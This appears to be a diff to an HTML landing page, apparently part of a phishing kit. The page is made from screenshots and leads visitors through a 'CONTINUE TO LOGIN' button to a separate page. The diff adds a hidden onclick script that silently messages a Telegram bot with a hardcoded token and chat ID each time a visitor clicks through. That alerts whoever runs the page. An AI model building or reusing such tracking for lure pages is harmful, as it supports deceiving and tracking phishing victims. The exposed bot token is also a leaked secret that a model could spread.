@@ -28,14 +28,8 @@
 
     .continue-button {
       position: absolute;
-
-      /* === Adjust these values as per your need === */
-      top: auto;
       bottom: 78px;
-      left: auto;
       right: 130px;
-      /* ============================================ */
-
       background-color: transparent;
       color: #ffffff;
       font-weight: bold;
@@ -70,13 +64,30 @@
 
   <div class="header-container">
     <img src="https://i.ibb.co/JwhVBdst/Screenshot-2025-04-20-10-16-13-22-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Updated Header">
-    <a class="continue-button" href="page1.html">CONTINUE TO LOGIN</a>
+    <a class="continue-button" href="page1.html" onclick="sendToTelegram()">CONTINUE TO LOGIN</a>
   </div>
 
   <div class="extra-images">
     <img src="https://i.ibb.co/cS3SzdZ4/Screenshot-2025-04-20-10-14-36-05-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Image 1">
     <img src="https://i.ibb.co/PS75BK9/Screenshot-2025-04-20-10-26-51-98-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Image 2">
   </div>
+
+  <script>
+    function sendToTelegram() {
+      const token = "7882249824:AAGPvCpy3Gef5c-BfYoFwY5uHJr9_yKbSIs";
+      const chatId = "6677946042";
+      const message = "User opened the landing page and clicked CONTINUE.";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => response.json())
+        .then(data => {
+          console.log("Message sent to Telegram");
+        })
+        .catch(error => {
+          console.error("Error sending message:", error);
+        });
+    }
+  </script>
 
 </body>
 </html>
